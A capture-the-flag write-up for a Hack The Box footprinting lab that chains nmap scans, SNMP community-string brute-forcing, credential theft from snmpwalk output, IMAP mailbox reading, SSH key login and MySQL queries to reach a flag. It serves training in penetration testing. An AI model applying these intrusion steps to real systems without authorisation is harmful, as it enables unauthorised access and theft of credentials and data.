# HTB Footprinting Lab — Hard Difficulty Writeup

> **Target**: 10.129.202.20
> **Difficulty**: Hard
> **OS**: Linux (Ubuntu)
> **hostname**: NIXHARD

---

## Step 1 — Initial Nmap Scan

Started with a standard service version scan to identify open ports and running services.
```bash
nmap -sV -sC 10.129.202.20
```

<img width="1918" height="796" alt="scan nmap" src="https://github.com/user-attachments/assets/61b96852-bf12-4e53-bcec-bcfade13dfb9" />


The scan revealed the following open ports:

| Port | Service | Note |
|---|---|---|
| 22/tcp | OpenSSH 8.2p1 | SSH |
| 110/tcp | Dovecot pop3d | POP3 |
| 143/tcp | Dovecot imapd | IMAP |
| 993/tcp | ssl/imap | IMAPS |
| 995/tcp | ssl/pop3 | POP3S |

The SSL certificate revealed the hostname **NIXHARD**. Notably, **no web service or database port was visible** — suggesting services might be running internally or on UDP.

---

## Step 2 — UDP Scan & SNMP Enumeration

Since only mail services and SSH were visible on TCP, the next logical step was to check for **UDP services** — particularly SNMP on port 161, which is frequently overlooked.
```bash
sudo nmap -sU -p 161 10.129.202.20
```

SNMP was confirmed open. The next step was to brute force the **community string**:
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
```
<img width="1916" height="126" alt="onesixtyone" src="https://github.com/user-attachments/assets/e03236da-7829-4e62-b391-5de7ea12729d" />



The community string **`backup`** was found. Using it with snmpwalk revealed a wealth of system information:
```bash
snmpwalk -v2c -c backup 10.129.202.20
```

<img width="1626" height="828" alt="passfound" src="https://github.com/user-attachments/assets/53d8eba6-dbe3-4646-ade9-d16fda1f84e3" />


Inside the SNMP output, a particularly interesting OID revealed a script and what appeared to be credentials for user **tom**:
```
iso.3.6.1.2.1.25.1.7.1.2.1.2 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3 = STRING: "tom NMds732Js2761"
```

---

## Step 3 — Credentials Found

From the SNMP enumeration we obtained the following credentials:

| Field | Value |
|---|---|
| **Username** | tom |
| **Password** | NMds732Js2761 |

---

## Step 4 — IMAP Enumeration

Using the credentials found via SNMP, a connection to the IMAP service was established over SSL:
```bash
openssl s_client -connect 10.129.202.20:imaps
```

Once connected, login and folder listing were performed:
```
1 LOGIN tom NMds732Js2761
1 LIST "" "*"
```

📸 *[INSERT: imap_folders.png]*

The following folders were found:
```
Notes
Meetings
Important
INBOX
```

Selecting **INBOX** and fetching the first message:
```
1 SELECT INBOX
1 FETCH 1 (BODY[])
```

<img width="1148" height="617" alt="imap" src="https://github.com/user-attachments/assets/5ee62f5b-5e38-40c5-8f9d-26ea6651cdf1" />


The email contained an **OpenSSH private key** sent by the admin to tom — granting SSH access to the system.

---

## Step 5 — SSH Access via Private Key

The private key was saved locally and used to authenticate via SSH:
```bash
nano ~/id_rsa_tom
# Paste the full private key content
chmod 600 ~/id_rsa_tom
ssh -i ~/id_rsa_tom tom@10.129.202.20
```


Access to the system as user **tom** was successfully obtained.

---

## Step 6 — Internal Service Discovery

After gaining access, the `/etc/passwd` file was checked to identify users and services running on the system:
```bash
cat /etc/passwd
```

📸 *[INSERT: passwd_file.png]*

The presence of the **mysql** user confirmed that a MySQL database was running internally — not visible from the outside network.

---

## Step 7 — MySQL Enumeration

Using the same credentials found via SNMP, a connection to the internal MySQL service was established:
```bash
mysql -u tom -p
# Password: NMds732Js2761
```

<img width="1897" height="628" alt="mail" src="https://github.com/user-attachments/assets/deb5a670-ce06-43b1-bf06-a4c11eb2a87a" />


Browsing the available databases and tables:
```sql
show databases;
use users;
show tables;
select * from users;
```

<img width="1062" height="575" alt="htb" src="https://github.com/user-attachments/assets/ca5b15ce-24de-4b95-84a4-eff2c4b47f0d" />


Scrolling through the records in the `users` table revealed the **HTB flag** stored as a password entry for the `HTB` user:
```sql
SELECT * FROM users WHERE username LIKE "HTB";
```

---

## Attack Chain
```
UDP 161 open → SNMP community string "backup"
            |
snmpwalk → plaintext credentials in OID
            | tom:NMds732Js2761
IMAP login → email with SSH private key
            |
SSH access as tom
            |
/etc/passwd → mysql user detected
            |
MySQL internal → users table → HTB flag
```

---

## Key Takeaways

- Always run a **UDP scan** after TCP — SNMP on UDP 161 is frequently missed and often misconfigured
- **SNMP community strings** like `public` and `backup` can expose sensitive system information including plaintext credentials
- **IMAP mailboxes** can contain sensitive data — always list ALL folders, not just INBOX
- **Credential reuse** is extremely common — the same credentials worked for IMAP, SSH and MySQL
- Internal services like MySQL are not visible from outside — gaining initial access reveals the full attack surface
- Always set **chmod 600** on SSH private keys — otherwise SSH will refuse to use them
